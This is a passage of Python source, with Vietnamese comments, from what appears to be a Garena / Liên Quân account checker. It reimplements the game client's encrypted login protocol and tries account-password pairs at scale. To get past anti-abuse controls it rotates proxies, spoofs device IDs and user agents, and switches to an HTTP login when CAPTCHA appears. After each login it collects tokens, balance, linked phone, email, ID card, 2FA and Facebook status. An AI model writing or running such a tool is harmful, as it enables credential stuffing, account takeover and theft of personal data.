                     'Connection reset', 'WinError', 'socket',
                     ' Tunnel ', 'SOCKS5 error')
    is_proxy_err = any(e in detail for e in _PROXY_ERRORS)
    is_bad = (
        status in ('TIMEOUT', 'PROXY_FAIL', 'CAPTCHA') or
        (status == 'ERROR' and is_proxy_err)
    )

    now = time.monotonic()
    with _health_lock:
        h = _proxy_health.get(proxy)
        if h is None:
            h = {'fails': 0, 'cooldown_until': 0}
            _proxy_health[proxy] = h
        if is_good:
            h['fails'] = 0
            h['cooldown_until'] = 0
        elif is_bad:
            h['fails'] += 1
            if h['fails'] >= PROXY_MAX_FAILS:
                h['cooldown_until'] = now + PROXY_COOLDOWN_S
        # else: neutral (MISS without skip code, etc.) — don't change


def _reset_proxy_health():
    """Clear all health records (call on proxy reload)."""
    global _proxy_health
    with _health_lock:
        _proxy_health = {}


def _next_proxy():
    """Return the next healthy proxy in round-robin order.  O(1).

    Skips proxies in cooldown.  Pure round-robin on the pre-built
    _proxy_list — no API calls, no resolution.
    """
    global _proxy_idx
    _refresh_rotating_proxies()
    with _proxy_lock:
        n = len(_proxy_list)
        if not n:
            return None
        now = time.monotonic()
        for _ in range(n):  # scan entire list to find healthy proxy
            p = _proxy_list[_proxy_idx % n]
            _proxy_idx += 1
            # Check health cooldown
            h = _proxy_health.get(p)
            if h and h['cooldown_until'] > now:
                continue  # proxy in cooldown, try next
            return p
    return None
def _get_http_proxies(proxy):
    """Build requests proxies dict from proxy tuple."""
    if not proxy:
        return None
    ip, port, user, pw = proxy
    if user and pw:
        url = f"http://{user}:{pw}@{ip}:{port}"
    else:
        url = f"http://{ip}:{port}"
    return {"http": url, "https": url}


def _connect_via_proxy(proxy, dest_host: str, dest_port: int, timeout: int = 20):
    """Create a TCP socket tunneled through an HTTP CONNECT proxy."""
    import base64
    ip, port, user, pw = proxy
    sock = _make_fast_socket(timeout)
    sock.connect((ip, port))
    # HTTP CONNECT
    connect_line = f"CONNECT {dest_host}:{dest_port} HTTP/1.1\r\nHost: {dest_host}:{dest_port}\r\n"
    if user and pw:
        cred = base64.b64encode(f"{user}:{pw}".encode()).decode()
        connect_line += f"Proxy-Authorization: Basic {cred}\r\n"
    connect_line += "\r\n"
    sock.sendall(connect_line.encode())
    resp = b''
    while b'\r\n\r\n' not in resp:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Proxy closed connection")
        resp += chunk
    status_line = resp.split(b'\r\n')[0].decode()
    if '200' not in status_line:
        sock.close()
        raise ConnectionError(f"Proxy CONNECT failed: {status_line}")
    return sock

# ── Protocol constants ──────────────────────────────────────────────────────
CLIENT_PLATFORM_ANDROID = 17
CLIENT_VERSION          = 283
CLIENT_TYPE             = 4352
CMD_LOGIN_PREPARE       = 256
CMD_LOGIN               = 257
CMD_LOGIN_INFO_GET      = 276
CMD_SESSION_TOKEN_GET   = 278
CMD_USER_BASIC_INFO_LIST_GET = 289
CMD_USER_FULL_INFO_LIST_GET  = 291
CMD_USER_GPP_INFO_LIST_GET   = 337
CMD_USER_ACCOUNT_INFO_GET    = 342
CMD_SSO_KEY_GET         = 442
CMD_APP_OAUTH_LOGIN     = 439
CMD_FB_USER_INFO_GET    = 467
CMD_C2S_REQUEST         = 2
LIEN_QUAN_APP_ID        = 100054
PACKET_VERSION          = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION

CLIENT_ID_MASK = 4354
_pkt_counter   = random.randint(0, 0x3FFFFF)

def _next_id() -> int:
    global _pkt_counter
    _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
    return CLIENT_ID_MASK | _pkt_counter

# ── XTEA-CBC (little-endian blocks, matching Android JNI libcrypt.so) ────────
_XTEA_DELTA  = 0x9E3779B9
_XTEA_ROUNDS = 32

def _mix(v: int) -> int:
    """((v << 4) ^ (v >> 5)) truncated to 32 bits, matching C uint32_t shift."""
    return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)

def _xtea_enc_block(v0: int, v1: int, key: bytes):
    k = struct.unpack('<4I', key)
    s = 0
    for _ in range(_XTEA_ROUNDS):
        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s  = (s + _XTEA_DELTA) & 0xFFFFFFFF
        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def _xtea_dec_block(v0: int, v1: int, key: bytes):
    k = struct.unpack('<4I', key)
    s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
    for _ in range(_XTEA_ROUNDS):
        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s  = (s - _XTEA_DELTA) & 0xFFFFFFFF
        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def xtea_encrypt(data: bytes, key: bytes) -> bytes:
    """XTEA-CBC encrypt matching libcrypt.so: [E(R)][CBC blocks][check block]
    - First 8 bytes = E_ECB(R) where R is random
    - CBC uses E(R) as the initial chaining value
    - Check block = E_ECB(last_CT ^ (R + sum_of_all_PT_blocks)), 64-bit LE addition
    """
    pad  = 8 - len(data) % 8
    data = data + bytes([pad] * pad)

    # Generate random R, encrypt it as first output block
    R = struct.unpack('<Q', os.urandom(8))[0]
    R_bytes = struct.pack('<Q', R)
    enc_R = struct.pack('<2I', *_xtea_enc_block(*struct.unpack('<2I', R_bytes), key))

    # CBC encrypt with E(R) as initial chain value
    prev = enc_R
    out  = bytearray(enc_R)       # first 8 bytes = E(R)
    pt_sum = R                    # accumulate R + all PT blocks
    last_ct = enc_R
    for i in range(0, len(data), 8):
        pt_block = data[i:i+8]
        pt_sum = (pt_sum + struct.unpack('<Q', pt_block)[0]) & 0xFFFFFFFFFFFFFFFF
        blk  = bytes(a ^ b for a, b in zip(pt_block, prev))
        v0, v1 = _xtea_enc_block(*struct.unpack('<2I', blk), key)
        prev = struct.pack('<2I', v0, v1)
        last_ct = prev
        out.extend(prev)

    # Check block = E_ECB(last_CT ^ pt_sum)
    last_ct_val = struct.unpack('<Q', last_ct)[0]
    check_input = last_ct_val ^ pt_sum
    check_bytes = struct.pack('<Q', check_input)
    check_enc = struct.pack('<2I', *_xtea_enc_block(*struct.unpack('<2I', check_bytes), key))
    out.extend(check_enc)
    return bytes(out)

def xtea_decrypt(data: bytes, key: bytes) -> bytes:
    """XTEA-CBC decrypt. Format: [E(R)][CBC blocks][check block]. Strip check, use E(R) as IV."""
    if len(data) < 24 or len(data) % 8 != 0:
        return data
    iv   = data[:8]             # E(R) — used as CBC chain start
    body = data[8:-8]           # CBC ciphertext (strip check block)
    out  = bytearray()
    prev = iv
    for i in range(0, len(body), 8):
        blk  = body[i:i+8]
        v0, v1 = _xtea_dec_block(*struct.unpack('<2I', blk), key)
        plain = bytes(a ^ b for a, b in zip(struct.pack('<2I', v0, v1), prev))
        out.extend(plain)
        prev = blk
    # Strip PKCS7 padding
    if out:
        pad = out[-1]
        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]):
            out = out[:-pad]
    return bytes(out)

# ── Minimal protobuf encode/decode ────────────────────────────────────────────
def _varint_enc(n: int) -> bytes:
    out = bytearray()
    while n > 0x7F:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n & 0x7F)
    return bytes(out)

def _pf_varint(tag: int, n: int) -> bytes:
    return _varint_enc((tag << 3) | 0) + _varint_enc(n)

def _pf_bytes(tag: int, b: bytes) -> bytes:
    return _varint_enc((tag << 3) | 2) + _varint_enc(len(b)) + b

def _pf_str(tag: int, s: str) -> bytes:
    return _pf_bytes(tag, s.encode('utf-8'))

def _proto_decode(data: bytes) -> dict:
    fields = {}
    pos = 0
    while True:
        try:
            key = 0; shift = 0
            while True:
                b = data[pos]; pos += 1
                key |= (b & 0x7F) << shift
                if not (b & 0x80): break
                shift += 7
            fn, wt = key >> 3, key & 7
            if wt == 0:
                val = 0; shift = 0
                while True:
                    b = data[pos]; pos += 1
                    val |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                fields[fn] = val
            elif wt == 2:
                ln = 0; shift = 0
                while True:
                    b = data[pos]; pos += 1
                    ln |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                fields[fn] = data[pos:pos+ln]
                pos += ln
            else:
                break
        except IndexError:
            break
    return fields

# ── TCP framing ───────────────────────────────────────────────────────────────
def _build_frame(cmd: int, body: bytes) -> bytes:
    """Wire format: [4B LE total] [2B BE header_len] [ClientPacketHeader proto] [body proto]"""
    hdr = (
        _pf_varint(1, PACKET_VERSION)   +   # version
        _pf_varint(2, _next_id())       +   # id
        _pf_varint(3, CMD_C2S_REQUEST)  +   # command_type
        _pf_varint(4, cmd)              +   # command
        _pf_varint(6, int(time.time()))     # timestamp
    )
    payload = struct.pack('>H', len(hdr)) + hdr + body
    return struct.pack('<I', len(payload)) + payload

def _recvall(sock, n: int) -> bytes:
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection dropped")
        buf += chunk
    return buf

def _recv_frame(sock) -> tuple:
    """Returns (header_fields_dict, body_bytes)"""
    size    = struct.unpack('<I', _recvall(sock, 4))[0]
    payload = _recvall(sock, size)
    hdr_len = struct.unpack('>H', payload[:2])[0]
    hdr     = _proto_decode(payload[2:2+hdr_len])
    body    = payload[2+hdr_len:]
    return hdr, body

def _recv_cmd_frame(sock, target_cmd: int, max_tries: int = 5) -> tuple:
    """Read frames until target command is found (skip spontaneous pushes)."""
    last_hdr, last_body = {5: -1}, b''
    for _ in range(max_tries):
        hdr, body = _recv_frame(sock)
        last_hdr, last_body = hdr, body
        if hdr.get(4, 0) == target_cmd:
            return hdr, body
    return last_hdr, last_body

# ── Login messages ────────────────────────────────────────────────────────────
def _account_type(account: str) -> int:
    if account.isdigit():
        return 3   # ACCOUNT_MOBILE
    if '@' in account:
        return 2   # ACCOUNT_EMAIL
    try:
        int(account)
        return 0   # ACCOUNT_UID
    except ValueError:
        return 1   # ACCOUNT_USERNAME

def _build_login_prepare(account: str, rand_key: bytes, captcha_key: str = "", captcha: str = "") -> bytes:
    inner = (
        _pf_varint(1, 0)                      +  # auth_type = AUTH_PASSWORD
        _pf_varint(2, _account_type(account)) +  # account_type
        _pf_str(3, account)                   +  # account
        _pf_varint(4, CLIENT_TYPE)            +  # client_type
        _pf_varint(5, CLIENT_VERSION)            # client_version
    )
    if captcha_key:
        inner += _pf_str(7, captcha_key)
    if captcha:
        inner += _pf_str(8, captcha)
        
    enc = xtea_encrypt(inner, rand_key)
    return _pf_bytes(1, rand_key) + _pf_bytes(2, enc)

def _derive_login_key(password: str, salt: str, verify_code: str):
    """Matches login/b/b.java 3-arg constructor exactly.
    strA = MD5hex(password)
    xtea_key = SHA256(hex(SHA256(strA + salt)) + verify_code)[:16]
    pw_hash  = strA.encode('ascii')
    """
    md5hex     = hashlib.md5(password.encode('utf-8')).hexdigest()
    inner_raw  = hashlib.sha256((md5hex + salt).encode('utf-8')).digest()
    inner_hex  = inner_raw.hex()
    xtea_key   = hashlib.sha256((inner_hex + verify_code).encode('utf-8')).digest()[:16]
    pw_hash    = md5hex.encode('ascii')
    return xtea_key, pw_hash

# ── Mã lỗi từ GxxData.Constant.Result (login/d.java, AnonymousClass8) ─────────
# result=1 → ERROR_AUTH       → sai mật khẩu
# result=2 → ERROR_ACCOUNT_NOT_EXIST → không có tài khoản
# result=3 → ERROR_CAPTCHA    → server yêu cầu CAPTCHA (bị rate-limit/block IP)
# result=4 → ERROR_AUTH_USER_BAN → tài khoản bị ban
# result=5 → ERROR_AUTH_SECURITY_BAN → bị ban bảo mật
_PREPARE_RESULT_MAP = {
    1: "INVALID",   # ERROR_AUTH - sai pass
    2: "NOT_FOUND", # ERROR_ACCOUNT_NOT_EXIST
    3: "CAPTCHA",   # ERROR_CAPTCHA - bị rate-limit, dùng HTTP fallback
    4: "BANNED",    # ERROR_AUTH_USER_BAN
    5: "SEC_BANNED",# ERROR_AUTH_SECURITY_BAN
}

def _http_login_garena(account: str, password: str, app_id: int = 100054,
                       proxy=None, timeout: int = 15) -> dict:
    """HTTP API login fallback - dùng khi TCP bị CAPTCHA (result=3).
    URL: https://{app_id}.connect.garena.com/api/login
    password = MD5hex(password)  (xem login/b/b.java)
    Trả về dict với 'uid', 'access_token', 'open_id' nếu thành công,
    hoặc {'error': ..., 'error_code': ...} nếu thất bại.
    """
    if not HAS_REQUESTS:
        return {'error': 'requests not available'}
    md5pw = hashlib.md5(password.encode('utf-8')).hexdigest()
    # Thu endpoint SSO (khong can CAPTCHA nhu TCP)
    url   = f"https://sso.garena.com/api/login"
    ts_ms = int(time.time() * 1000)
    params = {
        'app_id'      : str(app_id),
        'account'     : account,
        'password'    : md5pw,
        'redirect_uri': f'https://account.garena.com/',
        'format'      : 'json',
        'id'          : str(ts_ms),
    }
    # Danh sách thiết bị Android hiện đại để giả lập
    DEVICE_PROFILES = [
        "SM-S918B ;Android 13;vi;vn;", # S23 Ultra
        "SM-G998B ;Android 12;vi;vn;", # S21 Ultra
        "Pixel 7 ;Android 13;vi;vn;",
        "SM-A525F ;Android 12;vi;vn;", # A52
        "RMX3370 ;Android 12;vi;vn;",  # Realme GT Neo 2
        "M2102J20SG ;Android 11;vi;vn;", # POCO X3 Pro
    ]
    ua_profile = random.choice(DEVICE_PROFILES)
    headers = {
        'User-Agent': f'GarenaMSDK/5.12.1({ua_profile})',
        'Accept'    : 'application/json',
    }
    try:
        # SSO login là stateful — mỗi account có session/cookie riêng.
        # Dùng Session cục bộ, KHÔNG dùng session pool để tránh lẫn cookie.
        sess = _requests.Session()
        sess.verify = False
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        resp = sess.get(
            url, params=params, headers=headers,
            timeout=timeout, allow_redirects=False,
        )
        # Server trả về redirect 302 với access_token trong Location khi thành công
        if resp.status_code in (301, 302):
            loc = resp.headers.get('Location', '')
            # Trích access_token từ URL redirect
            m = re.search(r'access_token=([^&]+)', loc)
            m_uid = re.search(r'open_id=([^&]+)', loc)
            if m:
                return {
                    'access_token': m.group(1),
                    'open_id'     : m_uid.group(1) if m_uid else '',
                    '_method'     : 'http',
                }
        # Một số version trả JSON trực tiếp
        if resp.status_code == 200:
            try:
                data = resp.json()
                if 'access_token' in data:
                    return {
                        'access_token': data['access_token'],
                        'open_id'     : str(data.get('open_id', '')),
                        '_method'     : 'http',
                    }
                # Lỗi từ server
                return {
                    'error'     : data.get('error_description', data.get('error', 'unknown')),
                    'error_code': data.get('error', ''),
                }
            except Exception:
                pass
        return {'error': f'http_status={resp.status_code}'}
    except Exception as exc:
        return {'error': str(exc)}

def _build_login(account: str, password: str, salt: str, verify_code: str):
    xtea_key, pw_hash = _derive_login_key(password, salt, verify_code)
    user_status_bytes = _pf_varint(2, 4608)    # UserStatus { status=USER_STATUS_MOBILE_ACTIVE }
    # Fake thiết bị ngẫu nhiên hoàn toàn để tránh block
    device_id = os.urandom(16)
    inner = (
        _pf_bytes(1, pw_hash)                +  # password_hash (MD5hex as ASCII bytes)
        _pf_varint(2, 0)                     +  # login_mode = LOGIN_NORMAL
        _pf_bytes(3, user_status_bytes)      +  # user_status sub-message
        _pf_bytes(4, device_id)                 # device_id
    )
    enc  = xtea_encrypt(inner, xtea_key)
    body = _pf_bytes(1, enc)                    # LoginRequest.data
    return body, xtea_key

# ── Session-encrypted framing (post-login) ────────────────────────────────────
def _build_enc_frame(cmd: int, body: bytes, session_key: bytes) -> bytes:
    """Build a frame and encrypt payload with session_key (XTEA-CBC)."""
    hdr = (
        _pf_varint(1, PACKET_VERSION)   +
        _pf_varint(2, _next_id())       +
        _pf_varint(3, CMD_C2S_REQUEST)  +
        _pf_varint(4, cmd)              +
        _pf_varint(6, int(time.time()))
    )
    payload = struct.pack('>H', len(hdr)) + hdr + body
    enc_payload = xtea_encrypt(payload, session_key)
    return struct.pack('<I', len(enc_payload)) + enc_payload

def _recv_enc_frame(sock, session_key: bytes) -> tuple:
    """Receive and decrypt a session-encrypted frame."""
    size = struct.unpack('<I', _recvall(sock, 4))[0]
    enc_payload = _recvall(sock, size)
    payload = xtea_decrypt(enc_payload, session_key)
    hdr_len = struct.unpack('>H', payload[:2])[0]
    hdr  = _proto_decode(payload[2:2+hdr_len])
    body = payload[2+hdr_len:]
    return hdr, body

def _send_cmd(sock, cmd: int, body: bytes, session_key: bytes, max_tries: int = 5) -> tuple:
    """Send an encrypted command, skip spontaneous pushes, return matching response."""
    sock.sendall(_build_enc_frame(cmd, body, session_key))
    for _ in range(max_tries):
        hdr, resp_body = _recv_enc_frame(sock, session_key)
        resp_cmd = hdr.get(4, 0)
        if resp_cmd == cmd:
            return hdr, resp_body
        # Spontaneous push — skip and read next
    return {5: -1}, b''  # give up

# ── Post-login info fetchers ──────────────────────────────────────────────────
def _fetch_login_info(sock, session_key: bytes) -> dict:
    """CMD 276: region, shells, timestamps."""
    try:
        hdr, body = _send_cmd(sock, CMD_LOGIN_INFO_GET, b'', session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 14 in fields:
            info['region'] = fields[14].decode('utf-8') if isinstance(fields[14], bytes) else str(fields[14])
        if 15 in fields:
            info['ccu'] = fields[15]
        if 13 in fields:
            acc = _proto_decode(fields[13]) if isinstance(fields[13], bytes) else {}
            if 1 in acc: info['shells'] = acc[1]
            if 2 in acc: info['topup_time'] = acc[2]
        # Timestamps
        if 2 in fields: info['created_time'] = fields[2]      # account creation
        if 5 in fields: info['last_login'] = fields[5]         # last login timestamp
        return info
    except Exception:
        return {}

def _fetch_user_basic(sock, uid: int, session_key: bytes) -> dict:
    """CMD 289: username, nickname, avatar_id."""
    try:
        user_entry = _pf_varint(1, 0) + _pf_varint(2, uid)  # version=0, uid
        body = _pf_bytes(1, user_entry)
        hdr, resp = _send_cmd(sock, CMD_USER_BASIC_INFO_LIST_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        if 1 not in fields:
            return {}
        user_data = _proto_decode(fields[1]) if isinstance(fields[1], bytes) else {}
        info = {}
        # tag1=version, tag2=uid, tag3=username, tag4=nickname, tag5=avatar_data
        if 2 in user_data:
            info['uid'] = user_data[2]
        if 3 in user_data:
            info['username'] = user_data[3].decode('utf-8') if isinstance(user_data[3], bytes) else str(user_data[3])
        if 4 in user_data:
            info['nickname'] = user_data[4].decode('utf-8') if isinstance(user_data[4], bytes) else str(user_data[4])
        return info
    except Exception:
        return {}

def _fetch_account_info(sock, session_key: bytes) -> dict:
    """CMD 342: password_secured, email_verified, account_secured, mobile_bound.
    Java protobuf: tag4=password_secured, tag5=email_verified, tag6=account_secured, tag7=mobile_bound."""
    try:
        hdr, body = _send_cmd(sock, CMD_USER_ACCOUNT_INFO_GET, b'', session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 4 in fields: info['password_set'] = bool(fields[4])
        if 5 in fields: info['email_verified'] = bool(fields[5])
        if 6 in fields: info['account_secured'] = bool(fields[6])
        if 7 in fields: info['mobile_bound'] = bool(fields[7])
        return info
    except Exception:
        return {}

def _fetch_sso_key(sock, session_key: bytes) -> dict:
    """CMD 442: SSO key for HTTP APIs."""
    try:
        hdr, body = _send_cmd(sock, CMD_SSO_KEY_GET, b'', session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 1 in fields:
            info['sso_key'] = fields[1].decode('utf-8') if isinstance(fields[1], bytes) else str(fields[1])
        if 2 in fields:
            info['expiry'] = fields[2]
        return info
    except Exception:
        return {}

def _fetch_session_token(sock, session_key: bytes, app_id: int = 0) -> dict:
    """CMD 278: session token for HTTP APIs (app_id=0 for system token)."""
    try:
        body = b'' if app_id == 0 else _pf_varint(1, app_id)
        hdr, resp = _send_cmd(sock, CMD_SESSION_TOKEN_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        info = {}
        if 1 in fields:
            info['session_token'] = fields[1].decode('utf-8') if isinstance(fields[1], bytes) else str(fields[1])
        if 2 in fields:
            info['expiry'] = fields[2]
        return info
    except Exception:
        return {}

def _fetch_recent_games(session_token: str, proxy=None) -> dict:
    """HTTP: recent played games from GameAppService."""
    if not HAS_REQUESTS or not session_token:
        return {}
    try:
        url = f"https://garenaapp.garenanow.com/api/user/get_recent_games?session_key={session_token}"
        sess = _get_http_session(proxy)
        resp = sess.get(url, timeout=10, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            if 'error' not in data:
                return data
    except Exception:
        pass
    return {}


def _check_fb_avatar_status(fb_uid: int, proxy=None) -> str:
    """Check FB avatar status (live/die) with cache (from main_fixed_v4).

    Returns: 'live' (custom avatar), 'die' (default/silhouette), 'no' (no uid).
    Cached for 30 minutes to avoid repeated graph API calls.
    """
    if not fb_uid:
        return "no"
    now = time.time()
    with _fb_avatar_cache_lock:
        cached = _fb_avatar_cache.get(fb_uid)
        if cached and (now - cached[1]) < _FB_AVATAR_CACHE_TTL:
            return cached[0]
    if not HAS_REQUESTS:
        with _fb_avatar_cache_lock:
            _fb_avatar_cache[fb_uid] = ("live", now)
        return "live"
    try:
        url = f"https://graph.facebook.com/{fb_uid}/picture?type=normal&redirect=false"
        sess = _get_http_session(proxy)
        resp = sess.get(url, timeout=6)
        if resp.status_code != 200:
            with _fb_avatar_cache_lock:
                _fb_avatar_cache[fb_uid] = ("live", now)
            return "live"
        data = resp.json()
        pic_url = data.get("data", {}).get("url", "")
        is_silhouette = data.get("data", {}).get("is_silhouette", False)
        if is_silhouette:
            with _fb_avatar_cache_lock:
                _fb_avatar_cache[fb_uid] = ("die", now)
            return "die"
        if not pic_url:
            with _fb_avatar_cache_lock:
                _fb_avatar_cache[fb_uid] = ("die", now)
            return "die"
        pl = pic_url.lower()
        if any(p in pl for p in _FB_DEFAULT_PATTERNS):
            with _fb_avatar_cache_lock:
                _fb_avatar_cache[fb_uid] = ("die", now)
            return "die"
        if any(p in pl for p in _FB_CUSTOM_PATTERNS):
            with _fb_avatar_cache_lock:
                _fb_avatar_cache[fb_uid] = ("live", now)
            return "live"
        with _fb_avatar_cache_lock:
            _fb_avatar_cache[fb_uid] = ("live", now)
        return "live"
    except Exception:
        with _fb_avatar_cache_lock:
            _fb_avatar_cache[fb_uid] = ("live", now)
        return "live"


def _fb_parse_cmd467(resp: bytes) -> dict:
    """Giải payload CMD 467 -> fb_linked / fb_uid (một số bản client dùng field khác nhau)."""
    if not resp:
        return {"fb_linked": False}
    fields = _proto_decode(resp)
    inner = {}
    if 1 in fields and isinstance(fields[1], bytes):
        try:
            inner = _proto_decode(fields[1])
        except Exception:
            inner = {}
    elif 1 in fields and isinstance(fields[1], dict):
        inner = fields[1]
    if not isinstance(inner, dict):
        inner = {}
    uid = inner.get(4, 0)
    if isinstance(uid, bytes):
        try:
            uid = int.from_bytes(uid, "little") if len(uid) <= 8 else 0
        except Exception:
            uid = 0
    try:
        uid_i = int(uid) if uid else 0
    except (TypeError, ValueError):
        uid_i = 0
    if uid_i:
        return {"fb_linked": True, "fb_uid": uid_i}
    for tag in (1, 2, 3, 5, 6):
        v = inner.get(tag)
        if isinstance(v, bytes) and len(v.strip(b"\x00")) >= 6:
            try:
                v.decode("utf-8")
            except Exception:
                continue
            return {"fb_linked": True, "fb_uid": uid_i or None}
        if isinstance(v, str) and len(v.strip()) >= 3:
            return {"fb_linked": True, "fb_uid": uid_i or None}
    return {"fb_linked": False}


def _fetch_fb_info(sock, session_key: bytes, max_rounds: int = 3) -> dict:
    """CMD 467: Facebook đã liên kết. max_tries cao — tránh miss reply khi server push xen kẹp (bulk thread cao)."""
    import time as _t
    last = {"fb_linked": False}
    for attempt in range(max(1, int(max_rounds))):
        try:
            body = _pf_str(1, "")
            hdr, resp = _send_cmd(
                sock, CMD_FB_USER_INFO_GET, body, session_key, max_tries=28
            )
            if hdr.get(5, 0) != 0 or not resp:
                _t.sleep(0.04 * (attempt + 1))
                continue
            last = _fb_parse_cmd467(resp)
            if last.get("fb_linked"):
                return last
        except Exception:
            pass
        _t.sleep(0.04 * (attempt + 1))
    return last

def _fetch_oauth_token(sock, session_key: bytes, app_id: int, response_type: int = 2) -> dict:
    """CMD 439: get OAuth token for a specific app. response_type: 1=CODE, 2=TOKEN."""
    try:
        body = (
            _pf_varint(1, app_id) +
            _pf_str(2, "") +
            _pf_varint(3, response_type) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        info = {}
        if 1 in fields:
            info['access_token'] = fields[1].decode('utf-8') if isinstance(fields[1], bytes) else str(fields[1])
        if 4 in fields:
            info['open_id'] = fields[4].decode('utf-8') if isinstance(fields[4], bytes) else str(fields[4])
        return info
    except Exception:
        return {}

def _truthy_email_v(v) -> bool:
    """Chuẩn hóa email_v / cờ verify từ API: bool, int, float, str."""
    if v is None:
        return False
    if isinstance(v, bool):
        return v
    if isinstance(v, (int, float)):
        return v != 0
    if isinstance(v, str):
        s = v.strip().lower()
        if not s:
            return False
        if s in ("1", "true", "yes", "y", "verified", "verify", "confirmed", "active", "ok", "done"):
            return True
        try:
            return int(s, 0) != 0
        except ValueError:
            return False
    return False


def _user_info_says_email_verified(ui: dict) -> bool:
    """True khi account/init có cờ/string trạng thái đã verify (key API không cố định)."""
    if not isinstance(ui, dict):
        return False
    if "email_v" in ui:
        return _truthy_email_v(ui.get("email_v"))
    for key in (
        "email_verified",
        "is_email_verified",
        "emailVerified",
        "verified_email",
        "verify_email",
        "is_mail_verified",
    ):
        rv = ui.get(key)
        if rv is None:
            continue
        if _truthy_email_v(rv):
            return True
        if isinstance(rv, str) and rv.strip() and rv.strip().lower() in (
            "true", "verified", "yes", "active", "confirmed", "ok",
        ):
            return True
    for sk in ("email_status", "email_verify_status", "mail_status"):
        st = ui.get(sk)
        if st is None:
            continue
        s = str(st).strip().lower()
        if s in {"verified", "confirmed", "done", "success"}:
            return True
        if s in {"unverified", "pending", "inactive", "none", "false", "0"}:
            return False
    return False


def _merge_security_snapshots(a: dict, b: dict) -> dict:
    """Gộp hai snapshot bảo mật; giữ giá trị đã có, bổ sung chỗ trống."""
    if not a:
        return dict(b or {})
    if not b:
        return dict(a)
    out = dict(a)
    for k, v in b.items():
        if k == "fb_connected":
            out[k] = bool(out.get(k)) or bool(v)
            continue
        if k == "email_v":
            if "email_v" not in out or _truthy_email_v(v):
                out[k] = v
            out["email_verified"] = _truthy_email_v(out.get("email_v"))
            continue
        if k == "email_verified":
            if "email_v" not in out:
                out[k] = bool(out.get(k)) or bool(v)
            continue
        if k in ("authenticator_enable", "two_step_verify"):
            try:
                if int(out.get(k) or 0) == 0 and int(v or 0) != 0:
                    out[k] = v
            except Exception:
                pass
            continue
        if not str(out.get(k) or "").strip() and str(v or "").strip():
            out[k] = v
    if a.get("_http_success") or b.get("_http_success"):
        out["_http_success"] = True
    return out


def _parse_account_init_payload(data: dict) -> dict:
    """Parse account/init: user_info + các block bind/security lồng khác."""
    if not isinstance(data, dict):
        return {}
    merged = {"_http_success": True}
    ui = data.get("user_info")
    if isinstance(ui, dict):
        merged = _merge_security_snapshots(
            merged, _account_security_parse_user_info(ui)
        )
    for extra_key in (
        "bind_info",
        "user_bind",
        "security_info",
        "account_info",
        "social_bind",
    ):
        block = data.get(extra_key)
        if isinstance(block, dict):
            merged = _merge_security_snapshots(
                merged, _account_security_parse_user_info(block)
            )
    return merged


def _account_security_parse_user_info(ui: dict) -> dict:
    """Từ user_info của account/init -> dict masked_* + fb_* (fb: nhiều key API)."""
    info = {}
    phone = (
        ui.get("mobile_no")
        or ui.get("mobile")
        or ui.get("phone")
        or ui.get("bind_phone")
        or ""
    )
    cc = ui.get("country_code", "")
    if phone and phone.replace("*", ""):
        info["masked_phone"] = f"+{cc} {phone}" if cc else phone
    else:
        info["masked_phone"] = ""
    info["masked_email"] = (
        ui.get("email")
        or ui.get("masked_email")
        or ui.get("bind_email")
        or ui.get("mail")
        or ""
    )
    if "email_v" in ui:
        info["email_v"] = ui["email_v"]
        info["email_verified"] = _truthy_email_v(ui["email_v"])
    else:
        info["email_verified"] = _user_info_says_email_verified(ui)
    sts = ui.get("email_status") or ui.get("email_verify_status") or ui.get("mail_status") or ""
    info["email_status"] = str(sts).strip() if sts is not None else ""
    info["idcard"] = (
        ui.get("idcard")
        or ui.get("id_card")
        or ui.get("identity_no")
        or ui.get("identity")
        or ""
    )
    info["authenticator_enable"] = ui.get("authenticator_enable", 0) or ui.get(
        "authenticator_enabled", 0
    )
    # Chỉ two_step_verify_enable — không dùng two_step_verify/two_factor_enable (dễ trùng bind SĐT).
    info["two_step_verify"] = ui.get("two_step_verify_enable", 0)
    fa_raw = (
        ui.get("fb_account")
        or ui.get("fb_name")
        or ui.get("facebook_name")
        or ui.get("fb_display_name")
        or ""
    )
    fa = fa_raw.strip() if isinstance(fa_raw, str) else str(fa_raw or "").strip()
    fb_on = bool(
        ui.get("is_fbconnect_enabled")
        or ui.get("is_fb_connected")
        or ui.get("fb_connected")
        or ui.get("fb_connect")
    )
    if fa:
        fb_on = True
    for k in ("facebook_id", "fb_uid", "fb_id", "fb_user_id"):
        v = ui.get(k)
